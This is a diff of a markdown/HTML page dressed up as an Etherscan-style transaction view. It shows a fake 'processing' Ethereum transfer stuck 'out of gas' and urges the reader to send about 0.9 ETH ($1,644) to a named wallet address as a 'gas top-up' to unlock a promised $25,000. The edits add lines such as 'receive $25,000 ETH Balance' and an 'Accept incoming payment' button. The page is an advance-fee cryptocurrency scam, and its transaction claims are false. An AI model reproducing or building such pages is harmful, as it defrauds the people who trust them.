@@ -10,7 +10,7 @@
 <span style="color: green;">0xB23CA1460bc8af7c21e2262d92AD0DBD3C37222e</span>
  
 
-Transaction Hash: **0x7ec8ac921d0e92c[0x8Ecd6c6D14F8…d94Eb748761A0]**
+      Transaction Hash: 0x7ec8ac921d0e92c[0x8Ecd6c6D14F8…d94Eb748761A0
 
      
 | Address:                  |0xB23CA1460bc8a…D0DBD3C37222e|
@@ -28,8 +28,8 @@ Transaction Hash: **0x7ec8ac921d0e92c[0x8Ecd6c6D14F8…d94Eb748761A0]**
 <img src="IMG_9043.jpeg" alt="blockchain Logo" width="700" />
 
 <form action="https://phantom.com/" method="get">
-  <button type="submit"> [BUY ETH 0.89560913 ⛽️] </button>
-</form>
+  <button type="submit"> [TOP Gas ⛽️ ETH 0.89560913] </button>
+</form>  And receive $25,000 ETH Balance on your Eth address
 
 
 ***Gas*** (estimated) ***:***  [$1644 usd] **0.89560913 ETH***
@@ -39,18 +39,18 @@ Transaction Hash: **0x7ec8ac921d0e92c[0x8Ecd6c6D14F8…d94Eb748761A0]**
 |
 
 | ⛽️ Top up your ETH balance:  | 0x312e489D637e3D6a73255cD5f829d4A5d43b42Cd |
-|---------------------------|---------------------------|
+|------------------------------|--------------------------------------------|
 
 <img src="IMG_9083.jpeg" alt="blockchain Logo" width="38" />
 
-<span style="color: Blue;">**Contract**</span> <span style="color: Red;">Warning! Error encountered during contract execution [Out of gas]</span>
+<span style="color: Blue;">**Contract**</span> **:** <span style="color: Red;">Warning! Error encountered during contract execution [Out of gas]</span>
 
 
-✅ This transaction is <span style="color: Red;"> Processing </span> , Topup Eth Gas to Complete.✓⃝
+✅ This transaction is <span style="color: Red;"> Processing </span> ,Top-Up Eth Gas to Complete.✓⃝
 
 <img src="IMG_9063.jpeg" alt="payslip" width="700" />
 
-<span style="color: red;"> **SUMMARY~** <You need 0.89560913 more ETH to complete this transaction Buy more [$1644 usd] ETH to Complete transaction> </span>
+<span style="color: red;"> **SUMMARY~** <You need 0.89560913 more ETH to complete this transaction Buy more [$1644 usd] ETH For Gas Price> </span>
 
 
 <img src="IMG_8845.jpeg" alt="ethscan Logo" width="700" />
@@ -58,7 +58,7 @@ Transaction Hash: **0x7ec8ac921d0e92c[0x8Ecd6c6D14F8…d94Eb748761A0]**
 
 
 <form action="https://etherscan.io/" method="get">
-  <button type="submit"> ETH GAS PAID [$25,000]</button>
+  <button type="submit"> Accept incoming payment [$25,000] </button>
 </form>
 
 
